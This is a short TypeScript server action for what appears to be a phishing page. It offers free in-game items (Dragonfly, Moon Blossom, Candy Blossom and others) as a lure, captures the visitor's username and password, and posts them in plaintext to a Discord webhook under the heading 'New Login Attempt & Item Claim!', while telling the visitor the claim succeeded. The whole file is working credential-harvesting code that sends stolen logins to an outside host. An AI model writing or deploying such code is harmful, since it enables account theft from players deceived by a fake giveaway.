"use server"

export async function claimItemsAction(prevState: any, formData: FormData) {
  const username = formData.get("username") as string
  const password = formData.get("password") as string

  // Collect selected items
  const selectedItems: string[] = []
  if (formData.get("dragonfly") === "on") selectedItems.push("Dragonfly")
  if (formData.get("moon-blossom") === "on") selectedItems.push("Moon Blossom")
  if (formData.get("racoon") === "on") selectedItems.push("Racoon")
  if (formData.get("mimic") === "on") selectedItems.push("Mimic")
  if (formData.get("candy-blossom") === "on") selectedItems.push("Candy Blossom")
  if (formData.get("bone-blossom") === "on") selectedItems.push("Bone Blossom")

  // Construct the message for Discord
  const discordMessage = {
    content: "New Login Attempt & Item Claim!",
    embeds: [
      {
        title: "Login Details",
        color: 3447003, // A nice blue color
        fields: [
          {
            name: "Username",
            value: username,
            inline: true,
          },
          {
            name: "Password",
            value: password, // WARNING: Insecure for production!
            inline: true,
          },
          {
            name: "Selected Items",
            value: selectedItems.length > 0 ? selectedItems.join(", ") : "No items selected",
          },
        ],
        timestamp: new Date().toISOString(),
      },
    ],
  }

  const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL

  if (!WEBHOOK_URL) {
    console.error("DISCORD_WEBHOOK_URL environment variable is not set.")
    return { success: false, message: "Webhook URL not configured." }
  }

  try {
    const response = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(discordMessage),
    })

    if (response.ok) {
      return { success: true, message: "Items claimed and data sent to Discord!" }
    } else {
      const errorText = await response.text()
      console.error("Failed to send to Discord:", response.status, errorText)
      return { success: false, message: `Failed to claim items. Discord webhook error: ${response.status}` }
    }
  } catch (error) {
    console.error("Error sending to Discord webhook:", error)
    return { success: false, message: "An error occurred while claiming items." }
  }
}
